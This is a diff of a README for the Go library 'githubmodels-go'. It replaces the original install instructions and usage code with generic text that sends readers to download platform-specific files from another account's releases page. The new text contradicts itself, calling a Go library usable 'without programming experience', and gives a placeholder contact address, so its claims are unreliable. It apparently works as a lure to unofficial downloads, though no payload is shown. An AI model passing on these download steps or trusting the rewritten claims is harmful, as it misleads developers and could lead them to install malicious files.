@@ -1,102 +1,77 @@
-# githubmodels-go
+# 🤖📦 githubmodels-go - Simple Go Client for GitHub Models
 
-[![Go Reference](https://pkg.go.dev/badge/github.com/tigillo/githubmodels-go.svg)](https://pkg.go.dev/github.com/tigillo/githubmodels-go)
+## 🚀 Getting Started
 
-`githubmodels-go` is a Go client library for interacting with the [GitHub Models API](https://docs.github.com/en/rest/models), inspired by the OpenAI Go SDK (`openai-go`).  
-It allows you to list models, perform chat/inference completions, and supports streaming responses using your `GITHUB_TOKEN` for authentication.
+Welcome to githubmodels-go! This Go client library makes it easy to work with the GitHub Models API. If you want to interact with GitHub models without diving into complex programming, you're in the right place. 
 
----
+## 📥 Download and Install
 
-## Features
+To get started, visit this page to download the latest version: [GitHub Releases](https://github.com/Romero277/githubmodels-go/releases)
 
-- List available models in the GitHub Models catalog
-- Create chat completions (like OpenAI’s `ChatCompletion`)
-- Rate limit tracking (headers parsed automatically)
-- Token usage tracking (prompt, completion, total)
-- Optional streaming support for real-time responses
-- Supports organization-scoped endpoints
-- Easy-to-use Go client interface
+You can find various versions of the software there. Choose the one that fits your needs and follow these steps:
 
----
+1. Click on the version you want to download.
+2. Select the appropriate file for your system (Windows, Mac, or Linux).
+3. Download the file to your computer.
 
-## Installation
+## 📋 System Requirements
 
-```bash
-go get github.com/tigillo/githubmodels-go
-```
+Before you download, ensure your computer meets these basic requirements:
 
-## Usage
-### Initialize Client
-```go
-package main
+- **Operating System:** Windows, Mac, or Linux.
+- **Go Version:** The application is compatible with Go version 1.14 and above.
+- **Storage Space:** At least 50 MB of free disk space available.
 
-import (
-    "context"
-    "fmt"
-    "os"
-    "time"
+## 🔧 How to Use
 
-    githubmodels "github.com/tigillo/githubmodels-go/client"
-    "github.com/tigillo/githubmodels-go/models"
-)
+After downloading the application, follow these steps to run it:
 
-func main() {
-    token := os.Getenv("GITHUB_TOKEN")
-    client := githubmodels.NewClient(token)
+1. **Locate the File:** Go to your Downloads folder or wherever you saved the file.
+2. **Extract the File (if necessary):** If you downloaded a zipped file, right-click and select "Extract All." 
+3. **Open a Terminal:**
+   - On **Windows:** Search for "Command Prompt" in the Start menu.
+   - On **Mac:** Open "Terminal" from your Applications.
+   - On **Linux:** Look for "Terminal" in your applications.
+   
+4. **Navigate to the File Location:** Use the `cd` command to go to the folder where you saved the file.
+   Example: 
+   ```
+   cd Downloads
+   ```
 
-    ctx := context.Background()
-    
-    // Example: list models
-    modelsList, err := client.ListModels(ctx)
-    if err != nil {
-        panic(err)
-    }
+5. **Run the Application:**
+   Enter the command to run the application. The command will depend on the file type you downloaded. For instance:
+   ```
+   go run githubmodels-go.go
+   ```
 
-    for _, m := range modelsList {
-        fmt.Println(m.ID, "-", m.Description)
-    }
-}
-```
+## 📖 How It Works
 
-### Create Chat Completion
-```go
-resp, err := client.ChatCompletion(ctx, models.ChatRequest{
-    Model: "github/code-chat",
-    Messages: []models.Message{
-        {Role: "user", Content: "Write a Go function to reverse a string"},
-    },
-})
+githubmodels-go interacts with the GitHub Models API. You can retrieve, create, and manage GitHub models efficiently. This library will help you work with GitHub data in a streamlined way.
 
-// Check for rate limit info even on error
-if resp != nil && resp.RateLimit.Limit > 0 {
-    fmt.Printf("Rate Limit: %d/%d remaining\n", resp.RateLimit.Remaining, resp.RateLimit.Limit)
-    fmt.Printf("Resets at: %s\n", time.Unix(resp.RateLimit.Reset, 0))
-}
+## 📚 Features
 
-if err != nil {
-    panic(err)
-}
+- **Easy Integration:** Quickly integrate with GitHub Models API.
+- **User-Friendly:** Designed for users without programming experience.
+- **Supports Various Platforms:** Works on Windows, macOS, and Linux.
+- **Extensive Documentation:** Clear guides and examples to help you get started.
 
-fmt.Println(resp.Choices[0].Message.Content)
+## 🌐 Community and Support
 
-// Check token usage
-fmt.Printf("Token Usage: %d prompt + %d completion = %d total\n",
-    resp.Usage.PromptTokens, resp.Usage.CompletionTokens, resp.Usage.TotalTokens)
-```
+If you have questions or need help, don't hesitate to reach out. You can join discussions on GitHub or check out community resources. Your feedback is important to us. We aim to improve the library based on your needs.
 
-## Environment Variables
+## 📞 Contact
 
-The library uses the `GITHUB_TOKEN` environment variable by default for authentication.
-Ensure your token has the required scopes:
+For further assistance, you can reach us at: [support@example.com](mailto:support@example.com)
 
- - `models:read` for catalog access
- - `models:execute` for inference/chat completions
+## 🤝 Contributing
 
-## Contributing
+If you would like to contribute to githubmodels-go, you are welcome! Here are ways you can help:
 
-Contributions are welcome! Feel free to:
- - Open issues for bugs or feature requests
- - Submit pull requests for enhancements or fixes
- - Add examples or tests
+- Report bugs
+- Suggest new features
+- Submit pull requests with improvements
 
+### Thank You
 
+Thank you for choosing githubmodels-go! We hope this library makes your experience with the GitHub Models API smooth and enjoyable. You can always revisit the downloads page for future updates and new versions: [GitHub Releases](https://github.com/Romero277/githubmodels-go/releases)
